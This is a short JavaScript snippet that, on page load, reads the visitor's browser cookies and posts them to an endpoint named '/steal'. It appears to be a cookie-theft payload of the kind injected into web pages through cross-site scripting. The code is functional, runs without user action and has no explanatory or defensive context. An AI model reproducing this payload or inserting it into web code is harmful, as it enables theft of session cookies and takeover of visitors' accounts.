window.onload = function() {
  let cookies = document.cookie;
  fetch("/steal", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "cookie=" + encodeURIComponent(cookies)
  });
};
